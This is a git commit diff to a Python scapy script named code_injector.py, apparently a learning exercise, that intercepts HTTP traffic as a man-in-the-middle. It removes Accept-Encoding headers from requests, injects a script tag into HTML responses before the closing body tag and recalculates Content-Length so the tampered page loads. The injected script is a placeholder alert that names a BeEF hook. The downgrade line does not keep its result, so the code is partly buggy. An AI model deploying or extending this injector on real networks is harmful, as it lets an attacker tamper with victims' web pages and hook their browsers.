0b5e819ed6ee2e76bc3a0de5487e4bed96d311a7
Noe <Noe.BERDOZ@cpnv.ch>
2022-02-16 10:56:38 +0100

    Code Injector - Manage content length

--- code_injector.py
+++ code_injector.py
@@ -21,23 +21,23 @@ def process_packet(packet):
 
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-
+            load.replace("HTTP/1.1", "HTTP/1.0")  # replace HTTP newer version with a vulnerable one
             #  Regex: Accept-Encoding:.*?\\r\\n
             #  take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurrence '\r\n'
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Replace occurrence that change data format
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            load = load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")
-            print(scapy_packet.show())
-
-            #  TODO manage Content-Length
+            injection_code = "<script>alert('This could be a Beef Hook');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
             #  Regex: (?:Content-Length:\s)(\d*)
             #  take "Content-Length", "\s" space, \d* any number characters, "(?:)" exclude, "()" include
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search:
+            if content_length_search and "text/html" in load:  # Recalculate content length only if it's HTML page
                 content_length = content_length_search.group(1)  # (0) = Content-Length:\s\d*, (1) = (\d*)
-                print(content_length)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))  # maybe this could cause bugs
+                print("[+] Replaced content length: " + content_length + " with: " + str(new_content_length))
 
         # Set packet if his load has been modified
         if load != scapy_packet[scapy.Raw].load:
